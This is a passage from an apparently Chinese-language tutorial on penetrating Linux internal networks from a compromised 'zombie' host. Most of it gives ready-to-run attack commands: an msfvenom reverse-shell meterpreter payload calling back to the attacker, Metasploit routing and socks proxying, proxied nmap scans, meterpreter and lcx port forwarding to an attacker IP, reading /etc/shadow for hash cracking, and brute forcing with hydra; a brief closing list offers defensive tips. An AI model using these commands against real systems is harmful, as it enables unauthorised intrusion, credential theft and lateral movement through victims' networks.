    proxychains4 nmap -sT -Pn -n 192.168.16.0/24
注：此方案适合攻击者与肉鸡服务器都在各自内网环境，攻击者可以访问到目标服务器的http服务，通过该http服务进行代理转发（速度较慢）.
##### tcp代理转发
思路：通过metasploit木马反弹一个肉鸡的meterpreter shell到攻击机上，然后在meterpreter
shell上设置路由，我们便可以在攻击机上直接扫描肉鸡所在的网段服务器（这里是可以跨网段扫描的）。
生成msf木马
生成木马：
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机ip LPORT=8000 -f elf > shell_8000.elf
由于攻击机无法访问肉鸡的端口，而肉鸡可以访问攻击机的端口，因此生成一个反向的木马。
反弹shell
攻击机运行msfconsole，使用exoloit/multi/handler模块，set payload
linux/x86/meterpreter/reverse_tcp跟生成木马时用的payload一样。LPORT设置成木马将要连接的端口，运行后会在攻击机上监听一个端口，等待木马链接。  
此时将shell_8000.elf上传到肉鸡服务器上，添加权限后运行木马将会主动连接上攻击机监听的端口，并在攻击机上获取一个meterpreter
shell。
设置路由
上一步获取到了一个session，这个session是攻击机与肉鸡相互连接的会话。  
查看下肉鸡的网络情况：
    run get_local_subnets
[  
添加路由:
    run autoroute -s 192.168.16.0/24
查看路由：
    run autoroute –p
[  
一般来说，这里设置好路由就可以了，但是有些时候会发现在meterpreter中有效果，但是在msf中失效了，因此可以在msf中再设置一次。（但前提是meterpreter会话要一直存在）将该会话放入后台，进入msf中添加路由。  
查看路由：  
[  
这里已经是添加好的结果，添加路由命令：
    msf exploit(handler) > route add 192.168.16.0 255.255.255.0 12
    msf exploit(handler) > route add 192.168.17.0 255.255.255.0 12
注意：12表示session id，由于我们需要访问17网段，因此这里也要添加17网段的路由。
说明：以上2条路由的意思，是攻击机如果要去访问17或者16网段的资源，其下一跳是session12，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。
##### tcp全局代理转发
通过以上设置，在msf中可以访问内网资源了，但也仅限在msf中可以访问。如果想要其他工具也能使用代理，则要设置全局代理，这需要使用msf框架中的socks4a工具代理，目录：auxiliary/server/socks4a，然后配合Proxychains
，使用方法跟http代理类似。
注：此代理不是http代理，是tcp代理，因此需要目标服务器或者攻击者服务器，有一方在外网的环境，不然木马端口无法连接，也就无法获取meterpreter
shell。
metasploit操作可参考：[【渗透神器系列】Metasploit](https://thief.one/2017/08/01/1/)
#### 端口扫描工具
推荐使用metasploit进行tcp代理转发后，利用msf上面整合的很多扫描模块，直接进行扫描。  
扫描模块：
  * auxiliary/scanner/portscan 端口扫描
  * scanner/portscan/syn SYN端口扫描
  * scanner/portscan/tcp TCP端口扫描  
……
除此之外，也可以使用nmap等扫描工具，结合tcp全局代理转发即可。
### 针对22端口的入侵
扫描出内网服务器端口后，我们可以首先选择开放22端口的服务器进行入侵尝试。攻击22端口通常有2种方法，第一种是先读取肉鸡明文密码，再利用明文密码尝试登陆；第二种是字典暴力登陆。
#### 尝试hash破解
如果权限足够，我们可以顺利读取/etc/shadow文件的内容，然而是密文的，因此可以尝试用工具破解。
  * [John破解hash](http://www.openwall.com/john/)
  * [Hashcat](https://github.com/hashcat/hashcat)
注：windows下可以使用[mimikatz](https://github.com/gentilkiwi/mimikatz)
说明：获取linux账号的明文密码作用很大，因为内网环境管理员可能就那么几个，不同服务器所设置的密码也有可能相同，因此可以使用获取的服务器密码去尝试登陆其余开放了22端口的内网服务器。
#### 字典暴力破解
这个没啥好说的，主要看字典是否强大，以及是否有防止爆破限制。  
工具：
  * hydra
  * msf上的相应模块
### 针对其他端口的入侵
除了22端口外，21（ftp）、3306（mysql）、1433（mssql）等都可以通过暴力破解的方式。那么其他段端口呢？比如445、443等，这些则可以通过相应的漏洞进行攻击，通过可以使用nessus扫描器进行扫描，对发现的漏洞再集合msf上相应的模块进行攻击。
### 针对web服务的入侵
除了以上的端口外，还有一类端口比较特殊，那就是web服务类的端口，比如80、443、8000+等。由于这些端口上存在web应用，而web应用又是容易存在漏洞的点。因此可以重点寻找内网中存在web服务的服务器，并依照web渗透测试的流程对其web应用进行渗透。
### 端口转发的逆袭
前文介绍了端口转发技术，但在扫描环节中我并没有使用这种方案。那么是不是说端口转发在内网渗透中没有用武之地呢？  
事实并不是这样，内网扫描过后的漏洞利用攻击阶段，才是端口转发真正的舞台。在此阶段，我们可以利用端口转发，将某个存在漏洞的服务器的某个端口转发出来，单独攻击利用。我们可以想到在windows中，利用lcx转发3389端口，linux下同样可以转发22端口，当然更好用的是转发80端口，达到可以本地访问内网的web服务，从而继续web渗透的套路，扩大攻击面。
#### meterpreter实现端口转发
在meterpreter shell中输入：
    meterpreter > portfwd add -l 55555 -r 192.168.16.1 -p 3306
说明：表示将192.168.16.1服务器上的3306端口转发到本地（攻击机）的55555端口，然后我们可以在本地运行mysql –h 127.0.0.1
–u root –P 55555 –p 去登陆内网服务器的mysql。其他端口如ssh、ftp等都类似，这个过程跟msf代理很像。
##### 案例
将肉鸡的22端口转发到攻击机的2222端口，看一下连接情况。  
发现攻击机上监听了2222端口，连接到了本机其外一个高端口。  
[  
肉鸡的22端口也连接到了肉鸡自己的一个高端口  
[  
那么两台服务器之间的两个高端口之间是怎么连接的，我想肯定是利用meterpreter会话。因此meterpreter会话就相当于一个中间人，传递原本无法传递的消息。
#### lcx端口转发
攻击机:
    lcx -listen 2222 3333 # 2222为转发端口，3333为本机任意未被占用的端口
肉鸡：
    lcx -slave 110.1.1.1 2222 127.0.0.1 3389
110.1.1.1为攻击机外网ip，2222为转发端口，127.0.0.1为肉鸡内网ip，3389为远程终端端口 。
### 内网嗅探
windows下可以使用cain，linux下可以使用msf中的模块。当然一般情况下，最好不要用内网嗅探，因为动静太大，而且可能会影响内网网络。
### linux内网安全建议
说了这么多内网渗透的套路，按惯例最后该给出内网安全建设的几点建议了，当然只是个人看法。
  * 每台服务器上安装waf或者云盾，监控并拦截木马程序的运行
  * 监控服务器上开启的新端口，查看其连接情况，是否有异常连接
  * 服务器及时更新补丁
  * 服务器上运行的应用给予低权限